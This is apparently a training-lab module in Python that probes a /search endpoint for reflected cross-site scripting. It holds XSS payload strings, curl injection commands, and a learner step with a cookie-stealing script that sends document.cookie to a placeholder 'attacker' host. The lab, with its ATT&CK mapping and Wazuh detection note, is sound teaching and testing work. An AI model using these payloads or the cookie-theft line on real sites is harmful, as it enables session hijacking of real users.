"""
modules/xss.py — APP-01: Reflected Cross-Site Scripting probe.

Target: GET /search?q=<payload>
Vulnerability: q is rendered unsanitized into HTML response.
"""
from __future__ import annotations

from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_DEFAULT_PAYLOADS = [
    "<script>alert('XSS-LAB-01')</script>",
    "<img src=x onerror=alert('xss')>",
    "<svg onload=alert(document.domain)>",
    "javascript:alert(1)",
    '\"><script>alert(\"escaped\")</script>',
]


class XSSModule(BaseModule):
    module_id = "xss"
    name = "Reflected XSS"
    description = (
        "Injects XSS payloads into the /search endpoint and checks "
        "whether the payload is reflected verbatim in the response body."
    )
    category = Category.WEB
    scenario_id = "APP-01"
    severity = Severity.HIGH
    # MITRE ATT&CK — find the reflection (recon) then execute attacker JS in-browser.
    mitre = {
        "tactics": ["TA0043 Reconnaissance", "TA0002 Execution"],
        "techniques": [
            {"id": "T1595.002", "name": "Active Scanning: Vulnerability Scanning", "tactic": "Reconnaissance"},
            {"id": "T1059.007", "name": "Command and Scripting Interpreter: JavaScript", "tactic": "Execution"},
            {"id": "T1189", "name": "Drive-by Compromise", "tactic": "Initial Access"},
        ],
    }
    lab = {
        "target_path": "/search",
        "vulnerable_component": "Flask search handler (search_bp.search)",
        "story": (
            "The marketing team shipped a search box that prints the user's "
            "query directly into the page. Confirm the parameter is reflected "
            "without escaping, then prove attacker-controlled JavaScript runs "
            "in the victim's browser."
        ),
        "learner_steps": [
            {"action": "Recon: confirm the q parameter is reflected into the response.",
             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
             "command": "curl -s 'http://target-agent/search?q=attense_probe' | grep -o attense_probe",
             "expected": "The marker 'attense_probe' is echoed inside the results area — input is reflected."},
            {"action": "Test that HTML is not escaped (markup injection).",
             "technique": "T1059.007 Command and Scripting Interpreter: JavaScript",
             "command": "curl -s -G http://target-agent/search --data-urlencode 'q=<b>ATT</b>' | grep '<b>ATT</b>'",
             "expected": "The raw <b> tag comes back un-escaped — the page renders bold text."},
            {"action": "Execute a script payload (reflected XSS).",
             "technique": "T1059.007 Command and Scripting Interpreter: JavaScript",
             "command": "curl -s -G http://target-agent/search --data-urlencode \"q=<script>alert('XSS-LAB-01')</script>\"",
             "expected": "The <script> tag is reflected verbatim; in a browser the alert fires."},
            {"action": "Try filter-evasion variants that survive naive escaping.",
             "technique": "T1059.007 Command and Scripting Interpreter: JavaScript",
             "command": "curl -s -G http://target-agent/search --data-urlencode 'q=<img src=x onerror=alert(document.domain)>'",
             "expected": "The img/onerror handler is reflected — multiple sinks are exploitable."},
            {"action": "Weaponise: a victim who opens the crafted URL runs your JS (cookie theft).",
             "technique": "T1189 Drive-by Compromise",
             "command": "# http://target-agent/search?q=<script>new Image().src='//attacker/c?'+document.cookie</script>",
             "expected": "Delivering this link is a drive-by; the payload runs in the victim's session."},
        ],
        "detection_rule": "Wazuh web attack signature (XSS / script tag in URL)",
        "success_markers": [
            "✓ REFLECTED in the activity log",
            "Raw <script> / onerror visible in the response body",
            "Wazuh alert on the /search request",
        ],
        "quick_probe": "/search?q=<script>alert(1)</script>",
    }
    steps = [
        {
            'title': 'Probe /search with benign query',
            'tactic': 'Reconnaissance',
            'technique': 'T1595.002 Active Scanning: Vulnerability Scanning',
            'command': "curl -s 'http://target-agent/search?q=attense_probe'",
            'hint': 'Confirm the parameter is reflected into the HTML',
            'expected': 'Query string echoed verbatim in the page',
            'markers': ['Running ', 'XSS payloads'],
        },
        {
            'title': 'Inject payload variants',
            'tactic': 'Execution',
            'technique': 'T1059.007 Command and Scripting Interpreter: JavaScript',
            'command': "curl -s -G http://target-agent/search --data-urlencode \"q=<script>alert('XSS-LAB-01')</script>\"",
            'hint': '<script>, onerror, svg onload, javascript: URIs',
            'expected': 'Server returns 200 with the payload un-escaped',
            'markers': ['not reflected', 'REFLECTED'],
        },
        {
            'title': 'Verify reflection is exploitable',
            'tactic': 'Execution',
            'technique': 'T1059.007 Command and Scripting Interpreter: JavaScript',
            'command': "curl -s -G http://target-agent/search --data-urlencode 'q=<img src=x onerror=alert(document.domain)>'",
            'hint': 'Exact payload string present unescaped in response body',
            'expected': 'XSS confirmed on the matching payload',
            'markers': ['✓ REFLECTED', 'payloads reflected', 'Complete —'],
        },
    ]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="custom_payload",
                display_name="Custom Payload",
                description="Optional custom XSS payload to add to the default list",
                default="",
            ),
            ModuleOption(
                name="endpoint",
                display_name="Search Endpoint",
                description="Path of the vulnerable search endpoint",
                default="/search",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        endpoint = opts.get("endpoint", "/search")

        payloads = list(_DEFAULT_PAYLOADS)
        custom = opts.get("custom_payload", "").strip()
        if custom:
            payloads.append(custom)

        # ── Recon (T1595.002): baseline reflection probe before weaponising ──
        self._log(log_fn, "Recon: probing /search with a benign marker (attense_probe)...")
        base = self._get(target.base_url + endpoint, params={"q": "attense_probe"},
                         label="recon-baseline", timeout=target.timeout)
        if "attense_probe" in (base.detail or ""):
            base.evidence = "Input reflected — endpoint is a candidate for XSS."
        steps.append(base)

        self._log(log_fn, f"Running {len(payloads)} XSS payloads against {endpoint}")
        reflected_count = 0

        for i, payload in enumerate(payloads, 1):
            url = target.base_url + endpoint
            r = self._get(url, params={"q": payload},
                          label=f"payload-{i}", timeout=target.timeout)

            reflected = payload[:20] in (r.detail or "")
            if reflected:
                reflected_count += 1
                r.evidence = f"REFLECTED: {payload[:40]}"

            symbol = "✓ REFLECTED" if reflected else "– not reflected"
            self._log(log_fn, f"  [{i}/{len(payloads)}] {symbol}  |  {payload[:50]}")
            steps.append(r)

        summary = f"{reflected_count}/{len(payloads)} payloads reflected in response."
        return self._make_result(target, steps, summary, started)
